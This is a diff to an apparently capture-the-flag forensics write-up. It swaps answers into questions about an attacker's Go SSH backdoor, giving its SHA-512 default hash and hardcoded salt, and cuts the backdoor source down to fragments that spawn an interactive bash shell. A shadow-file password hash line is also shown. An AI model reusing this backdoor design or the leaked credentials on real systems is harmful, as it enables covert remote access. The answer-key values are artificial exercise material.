@@ -148,7 +148,7 @@ muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3we
 <br>
 
 > 2.1. <em>What's the default hash for the backdoor?</em><br><a id='2.1'></a>
->> <code><strong>/development/</strong></code>
+>> <code><strong>bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3</strong></code>
 
 
 <br>
@@ -207,46 +207,28 @@ func main() {
                 Handler:         sshterminal,
                 Version:         fingerprint,
                 PasswordHandler: passwordHandler,
-        }
-        server.AddHostKey(privateKey)
-        log.Println("Started SSH backdoor on", server.Addr)
-        log.Fatal(server.ListenAndServe())
-}
-func verifyPass(hash, salt, password string) bool {
-        resultHash := hashPassword(password, salt)
-        return resultHash == hash
-}
+...
+</code></pre>
 
-func hashPassword(password string, salt string) string {
-        hash := sha512.Sum512([]byte(password + salt))
-        return fmt.Sprintf("%x", hash)
-}
+<br>
 
-func sshHandler(s ssh.Session) {
-        command := s.RawCommand()
-        if command != "" {
-                s.Write(runCommand(command))
-                return
-        }
-        term := terminal.NewTerminal(s, "$ ")
-        for {
-                command, _ = term.ReadLine()
-                if command == "exit" {
-                        return
-                }
-                term.Write(runCommand(command))
-        }
-}
 
-func sshterminal(s ssh.Session) {
-        cmd := exec.Command("/bin/bash", "-i")
-        ptyReq, _, isPty := s.Pty()
-        if isPty {
-                cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
-                f, err := pty.Start(cmd)
-                if err != nil {
-                        panic(err)
-                }
+<br>
+
+> 2.2. <em>What's the hardcoded salt for the backdoor?</em><br><a id='2.2'></a>
+>> <code><strong>1c362db832f3f864c8c2fe05f2002a05</strong></code>
+
+
+<br>
+
+<pre><code>└─$ cat main.go         
+package main
+
+import (
+        "crypto/sha512"
+        "fmt"
+ ...
+               }
                 go func() {
                         io.Copy(f, s) // stdin
                 }()
@@ -267,11 +249,21 @@ func runCommand(cmd string) []byte {
 func passwordHandler(_ ssh.Context, password string) bool {
         return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
 }
-                                                                              </code></pre>
+        
+</code></pre>
 
-                                                                              <br>
+<br>
 
-                                                                              
+
+> 2.3. <em>What was the hash that the attacker used? - go back to the PCAP for this!</em><br><a id='2.3'></a>
+>> <code><strong>_______</strong></code>
+
+
+<br>
+
+
+
+
 
 <br>
 <h2>Room Complete</h2>
